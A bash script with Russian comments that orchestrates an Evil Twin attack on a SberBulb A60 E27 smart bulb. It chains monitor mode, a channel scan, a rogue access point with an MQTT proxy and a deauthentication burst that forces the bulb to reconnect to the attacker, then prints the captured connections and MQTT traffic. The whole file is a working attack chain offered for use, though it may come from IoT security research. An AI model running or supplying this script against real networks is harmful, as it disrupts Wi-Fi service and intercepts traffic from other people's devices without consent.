#!/bin/bash
# главный скрипт — запускает всю цепочку атаки
# использование: sudo ./run_attack.sh

cd "$(dirname "$0")"

if [ "$EUID" -ne 0 ]; then
    echo "[log] запускай от root: sudo $0"
    exit 1
fi

echo "[log] === Evil Twin на SberBulb A60 E27 ==="
echo ""

# шаг 1: monitor mode
echo "[log] шаг 1: monitor mode"
bash 01_monitor.sh start
sleep 2

# шаг 2: сканирование — находим канал домашнего AP
echo ""
echo "[log] шаг 2: сканирование"
bash 02_scan.sh
echo ""

# шаг 3: поднимаем Evil Twin и MQTT прокси
echo "[log] шаг 3: запускаем Evil Twin"
bash 04_evil_twin.sh start
sleep 3
echo ""

# шаг 4: deauth в фоне — лампочка переподключится к нам
echo "[log] шаг 4: deauth атака (10 секунд)"
timeout 10 bash 03_deauth.sh || true
echo ""

echo "[log] ждём 5 секунд пока лампочка переподключится..."
sleep 5

# смотрим результат
echo ""
echo "[log] проверяем подключения:"
echo "--- hostapd (подключения к нашему AP) ---"
tail -5 logs/hostapd.log 2>/dev/null

echo ""
echo "--- DHCP аренды ---"
cat /var/lib/misc/dnsmasq.leases 2>/dev/null

echo ""
echo "--- MQTT прокси ---"
tail -10 logs/mqtt_proxy.log 2>/dev/null

echo ""
echo "[log] готово. для остановки: sudo bash 04_evil_twin.sh stop && sudo bash 01_monitor.sh stop"
